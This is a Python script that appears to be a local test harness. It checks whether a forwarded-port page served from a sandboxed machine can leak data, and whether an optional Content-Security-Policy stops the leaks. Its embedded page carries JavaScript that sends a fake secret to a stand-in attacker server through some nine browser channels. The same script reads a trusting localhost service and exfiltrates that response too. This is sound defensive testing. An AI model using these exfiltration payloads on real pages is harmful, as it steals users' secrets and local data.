"""Three servers on loopback:
  3000  what listens in the computer, reached from the Mac through a forwarded port. Its page carries a secret.
        With CSP=1 the forwarder adds a strict Content-Security-Policy to every reply, as Silo could.
  4000  the attacker's server on the internet. Logs every hit.
  5000  a service on the Mac itself (a dev server, a local model API) that trusts localhost origins."""
import http.server, json, os, sys, threading, urllib.parse
LOG = sys.argv[1]; CSP = os.environ.get("CSP") == "1"
SECRET = "AKIA-FAKE-SECRET-123"
PAGE = """<!doctype html><title>dev preview</title><h1>Your app</h1>
<a id=a href="http://127.0.0.1:4000/ping-target" ping="http://127.0.0.1:4000/hit?via=a-ping">link</a>
<form id=f method=POST action="http://127.0.0.1:4000/hit?via=form"><input name=d value="S"></form>
<script>
const S = "%s";
const hit = v => "http://127.0.0.1:4000/hit?via=" + v + "&d=" + S;
try { fetch(hit("fetch"), {mode: "no-cors", method: "POST", body: S}); } catch (e) {}
try { navigator.sendBeacon(hit("beacon"), S); } catch (e) {}
try { new Image().src = hit("img"); } catch (e) {}
try { const w = new WebSocket("ws://127.0.0.1:4000/ws?d=" + S); } catch (e) {}
try { const l = document.createElement("link"); l.rel = "prefetch"; l.href = hit("prefetch"); document.head.appendChild(l); } catch (e) {}
try { const i = document.createElement("iframe"); i.src = hit("iframe"); document.body.appendChild(i); } catch (e) {}
// Reach a service on the Mac, read its answer, and carry it out.
fetch("http://127.0.0.1:5000/api/tags").then(r => r.text()).then(t => { new Image().src = hit("mac-service") + "&got=" + encodeURIComponent(t); }).catch(e => {});
setTimeout(() => { try { document.getElementById("a").click(); } catch (e) {} }, 300);
setTimeout(() => { location.href = hit("navigation"); }, 1500);
</script>""" % SECRET
CSP_V = "default-src 'self'; script-src 'self' 'unsafe-inline'; connect-src 'self'; img-src 'self'; frame-src 'none'; form-action 'self'; base-uri 'none'; object-src 'none'"
def mk(port, handler):
    s = http.server.ThreadingHTTPServer(("127.0.0.1", port), handler); threading.Thread(target=s.serve_forever, daemon=True).start()
class Computer(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        b = PAGE.encode(); self.send_response(200); self.send_header("content-type", "text/html")
        if CSP: self.send_header("content-security-policy", CSP_V)
        self.send_header("content-length", str(len(b))); self.end_headers(); self.wfile.write(b)
class Attacker(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _h(self):
        q = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        with open(LOG, "a") as f: f.write(json.dumps({"method": self.command, "via": q.get("via", ["ws" if "ws" in self.path else "?"])[0], "got_secret": SECRET in urllib.parse.unquote(self.path), "mac_data": q.get("got", [None])[0]}) + "\n")
        self.send_response(204); self.end_headers()
    do_GET = do_POST = _h
class MacService(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        o = self.headers.get("origin", "")
        b = b'{"models":["private-model-on-the-mac"]}'; self.send_response(200)
        if o.startswith("http://127.0.0.1") or o.startswith("http://localhost"): self.send_header("access-control-allow-origin", o)
        self.send_header("content-length", str(len(b))); self.end_headers(); self.wfile.write(b)
mk(3000, Computer); mk(4000, Attacker); mk(5000, MacService)
threading.Event().wait()
